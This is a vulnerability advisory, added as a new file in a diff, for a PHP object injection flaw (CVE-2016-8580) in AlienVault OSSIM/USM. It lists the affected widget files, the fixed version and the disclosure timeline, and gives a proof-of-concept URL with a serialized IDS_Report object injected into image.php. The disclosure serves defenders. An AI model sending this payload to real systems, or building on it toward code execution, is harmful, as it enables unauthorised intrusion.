@@ -1,0 +1,50 @@
+Details
+=======
+
+Product: Alienvault OSSIM/USM
+Vulnerability: PHP Object Injection
+Author: Peter Lapp, lappsec () gmail com
+CVE: CVE-2016-8580
+Vulnerable Versions: <=5.3.1
+Fixed Version: 5.3.2
+
+
+
+Vulnerability Details
+=====================
+
+A PHP object injection vulnerability exists in multiple widget files
+due to the unsafe use of the unserialize() function. The affected
+files include flow_chart.php, gauge.php, honeypot.php,
+image.php,inventory.php, otx.php, rss.php, security.php, siem.php,
+taxonomy.php, tickets.php, and url.php.
+An authenticated attacker could send a serialized PHP object to one of
+the vulnerable pages and potentially gain code execution via magic
+methods in included classes.
+
+
+
+POC
+====
+
+This benign POC injects the IDS_Report class from PHPIDS into the
+refresh parameter of image.php. The __toString method of IDS_Report is
+then executed and the output is displayed in the value of the content
+field in the response:
+
+/ossim/dashboard/sections/widgets/data/image.php?type=test&wtype=blah&height=1&range=1&class=1&id=&adj=1&value=a%3A5%3A{s%3A3%3A%22top%22%3Bs%3A1%3A%221%22%3Bs%3A10%3A%22adjustment%22%3Bs%3A8%3A%22original%22%3Bs%3A6%3A%22height%22%3Bs%3A3%3A%22123%22%3Bs%3A7%3A%22refresh%22%3BO%3A10%3A%22IDS_Report%22%3A3%3A{s%3A9%3A%22%00*%00events%22%3Bs%3A9%3A%22testevent%22%3Bs%3A7%3A%22%00*%00tags%22%3Bs%3A1%3A%221%22%3Bs%3A9%3A%22%00*%00impact%22%3Bs%3A16%3A%22Object+Injection%22%3B}s%3A7%3A%22content%22%3Bs%3A36%3A%22aHR0cDovL3d3dy50ZXN0LmNvbS8xLnBuZw%3D%3D%22%3B}
+
+
+
+Timeline
+========
+
+08/03/16 - Reported to Vendor
+10/03/16 - Fixed in version 5.3.2
+
+
+
+References
+==========
+
+https://www.alienvault.com/forums/discussion/7766/security-advisory-alienvault-5-3-2-address-70-vulnerabilities
